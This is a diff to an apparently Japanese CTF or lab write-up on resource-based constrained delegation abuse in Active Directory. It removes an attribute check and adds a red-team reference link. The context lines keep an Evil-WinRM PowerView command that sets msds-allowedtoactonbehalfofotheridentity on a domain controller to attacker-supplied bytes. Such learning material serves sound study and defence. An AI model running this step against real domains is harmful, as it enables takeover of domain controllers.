@@ -80,13 +80,6 @@ DC
 MANAGEMENT
 attackersystem
 
-# 属性がセットされていないことを確認
-*Evil-WinRM* PS C:\Users\support> Get-DomainComputer dc | select name,msds-allowedtoactonbehalfofotheridentit
-
-name msds-allowedtoactonbehalfofotheridentit
----- ---------------------------------------
-DC
-
 *Evil-WinRM* PS C:\Users\support> Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 ```
 
@@ -279,6 +272,7 @@ Cached Tickets: (1)
 # 参考
 
 - [解説動画あり]https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall
+- [Kerberos Resource-based Constrained Delegation: Computer Object Takeover(Red Teaming Experiments)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
 - [PENETRATION TESTING LAB](https://pentestlab.blog/2021/10/18/resource-based-constrained-delegation/)
 - [HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)
 - [delegationやkerberosに関するイラストあり](https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks)
